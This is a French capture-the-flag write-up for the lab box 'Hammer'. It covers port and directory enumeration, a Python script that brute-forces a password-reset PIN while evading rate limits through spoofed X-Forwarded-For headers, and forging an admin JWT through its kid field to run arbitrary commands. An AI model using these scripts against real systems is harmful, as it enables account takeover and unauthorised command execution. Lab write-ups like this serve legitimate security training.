---
title: Hammer
tableOfContents: false
---


<center>
  <img src="hammer_logo.png" width="200px">
</center>


Hammer est une box de niveau moyen qui consiste à exploiter les vulnérabilités d'un système d'authentification. Après une brève énumération des ports, on se retrouve sur une page d'authentification classique avec login/mot de passe et le lien pour réinitialiser le mot de passe. Nous n'avons pas de comptes ni d'email donc nous allons commencer à énumérer les dossiers possibles.

## Reconnaissance

### Port Enumeration

```bash
nmap -sS -sV -p- hammer.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for hammer.thm (10.80.140.21)
Host is up (0.0021s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds

```

### Directory Enumeration

Dans le code source de l'application, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : "hmr_NOMDOSSER".

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://hammer.thm:1337/hmr_FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://hammer.thm:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 320, Words: 20, Lines: 10]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10]
```

### Logs

Dans le dossier logs on trouve : 

```bash
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down

```

On apprend donc : 
* Qu'il y a un utilisateur ayant pour mail : tester@hammer.thm
* l'application a pour contexte d'execution le dossier /var/www/html


## Exploitation

On observe que la fonctionnalité de réinitialisation du mot de passe utilise un rate limit. on va automatiser le brute-force du reset de mot de passe (l’envoi du code pin à 4 digits) et essayer de contourner la limitation.

### Contournement des limitations

Pour contourner le Send-Rate-Limit, on essaie ces différentes options :

* **Parameter Pollution** : KO —> Impossible d’élever la limite ou alors de définir le recovery_code à la main
* **Changement de User-Agent** : KO —> La limite reste
* **Modification de la casse** : KO —> erreur Apache
* **X-Forwarded-For** : OK —> Bypass : on arrive à faire un nombre illimité de requêtes
    
### Réinitialisation du mot de passe

```bash
#!python3 
import requests, sys, re, time

s = requests.Session()
NEW_PASS="password123"
URL = "http://hammer.thm:1337/reset_password.php"
headers = { "Content-Type": "application/x-www-form-urlencoded", "Rate-Limit-Pending":"10000"}
s_code=180
delay=0

s.get(URL)
primo = s.post(URL, data={"email":'tester@hammer.thm'}, headers=headers)
print(f"{primo.headers}")
print('#'*20)

for i in ["%04d" % x for x in range(10000)] :
    datas={"recovery_code":i,"s":s_code}
    headers["User-Agent"]=f"Test{i}"
    headers["X-Forwarded-For"]=f"0.0.0.{i}"
    r = s.post(URL, data=datas, headers=headers)
    print(f"CODE {i} (s={s_code}) : HTTP {r.status_code} ")
#    print(r.text)

    if not "Invalid or expired" in r.text :
        print (f"[!] Code trouvé : {i}")
        break;

    # your code in 180 seconds
    s_code = int(re.search(r'your code in (\d+) seconds', r.text).group(1))
    time.sleep(delay)
#    s_code=s_code-1

new_pass_datas={"new_password":f"{NEW_PASS}","confirm_password":f"{NEW_PASS}"}
final_req = s.post(URL, data=new_pass_datas, headers=headers)

print(f"[*] Changement de mot de passe pour {NEW_PASS}")
```


### Commandes d'administration

Après la connexion, on se retrouve sur une page web nous permettant d'exécuter des commandes bash. 

On s’aperçoit qu’à part la commande ls, il n’y a pas beaucoup de commandes possible. Nous allons donc essayer de les énumérer. On peut automatiser l’exécution des commandes : 

```bash
#!python3 
import requests, sys, re, time
import urllib.parse
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("command")
args = parser.parse_args()

s = requests.Session()
PASS="password123"
URL = "http://hammer.thm:1337/index.php"
URL_exec= "http://hammer.thm:1337//execute_command.php"
headers = { "Content-Type": "application/x-www-form-urlencoded"}
delay=0

s.get(URL)
co = s.post(URL, data={"email":"tester@hammer.thm", 'password':PASS}, headers=headers)
#print(co.text)

headers = { "Content-Type": "application/json"}

token = re.search(r"var jwtToken = '(.*?)'", co.text).group(1)
cmd = urllib.parse.quote_plus("ls")
headers["Authorization"]=f"Bearer {token}"

stdout = s.post(URL_exec, json={"command":args.command}, headers=headers)
try :
	print(stdout.json()["output"])
except : 
	print(stdout.json()["error"])
```

### Enumération locale

Cela nous permet d’énumérer les commandes possibles et on s’aperçoit que seule la commande ls est autorisée. La suite du problème sera donc dans les fichiers disponibles dans notre dossier. 

```bash
root@ip-10-82-106-93:~# for c in $(ls /bin); do   python3 exec_cmd.py "$c" | grep -v "Command not allowed" && echo $c ; done
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor

ls

```

Il y a un fichier 188ade1.key qui peut potentiellement nous permettre de chiffrer le jwt avec une autre clé et donc changer de compte pour élever nos privilèges.  Cette clé est téléchargeable : http://hammer.thm:1337/i88ade1.key. 
On sait que notre application se trouve dans **/var/www/html** comme vu dans les logs que nous avons trouvé lors de la phase d’énumération. 

# Post Exploitation : Escalade de privilège

## Faille

En observant le code source de la page, on s’aperçoit que celle-ci appelle une API sécurisée par un token JWT dont le payload et le header sont : 

```bash
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}.
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1764006630,
  "exp": 1764010230,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

On modifie les champs kid et role JWT pour avoir les droits admin et on crée une nouvelle signature avec la clé téléchargée : 

```bash
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}.
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1764006630,
  "exp": 1764010230,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

## Exploit

En modifiant le payload JWT dans notre script  et en changeant la clé qui est utilisé pour signer le token, on obtient les droits admin sur l’API, ce qui nous permet d’exécuter n’importe quelle commande et de retrouver le drapeau :

```bash
root@ip-10-80-65-226:~# python3 ./exec_command.py "cat /home/ubuntu/flag.txt"
THM{XXXXXXXXXXXXXXXX}
```